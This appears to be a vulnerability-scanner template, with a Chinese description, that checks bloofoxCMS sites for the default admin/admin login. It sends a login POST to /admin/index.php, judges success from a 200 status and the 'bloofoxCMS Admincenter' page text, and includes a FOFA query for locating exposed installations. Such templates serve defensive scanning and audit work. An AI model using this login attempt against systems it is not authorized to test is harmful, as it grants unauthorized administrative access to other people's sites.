id: bloofoxcms-default-login

info:
  name: bloofoxCMS 默认口令登录（弱口令）
  author: theamanrawat
  severity: high
  description: |
    该模板通过尝试 bloofoxCMS 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://www.bloofox.com/automated_setup.113.html
    - https://www.bloofox.com
  classification:
    cpe: cpe:2.3:a:bloofox:bloofoxcms:*:*:*:*:*:*:*:*
  metadata:
    verified: "true"
    max-request: 1
    vendor: bloofox
    product: bloofoxcms
    fofa-query: "Powered by bloofoxCMS"
  tags: bloofox,cms,default-login,vuln

http:
  - raw:
      - |
        POST /admin/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&action=login

    attack: pitchfork
    payloads:
      username:
        - "admin"
      password:
        - "admin"
    redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - contains(body, 'bloofoxCMS Admincenter')
          - status_code == 200
        condition: and
